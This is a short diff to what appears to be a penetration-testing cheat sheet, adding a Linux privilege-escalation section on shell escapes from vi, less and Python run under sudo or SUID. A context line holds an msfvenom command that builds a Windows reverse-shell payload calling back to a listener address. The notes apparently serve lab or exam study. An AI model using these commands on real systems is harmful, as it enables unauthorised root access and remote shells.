@@ -870,6 +870,16 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.134 LPORT=443 EXITFUNC=threa
 You can use `i686-w64-mingw32-gcc` to compile a window execuiteable on a linux machine.  You
 can then use `wine` to execute it.
 
+## Privesc on Linux
+
+### Non-Restrictive Sudo and Set UID bit
+Lots of programs can allow you to get a shell if you can run it as root either by being
+allowed via sudo or if the SUID bit is set for it.
+
+* vi and vim - In the program hiting ESC then `:sh` will bring up a shell
+* less - Run less on a file then tyep `! /bin/bash` to get a shell
+* Python and other scrypting engines - create your own shell.
+   * Python - sudo python -c 'import pty;pty.spawn("/bin/bash")'
 
 
 ### Usefull Windows commands
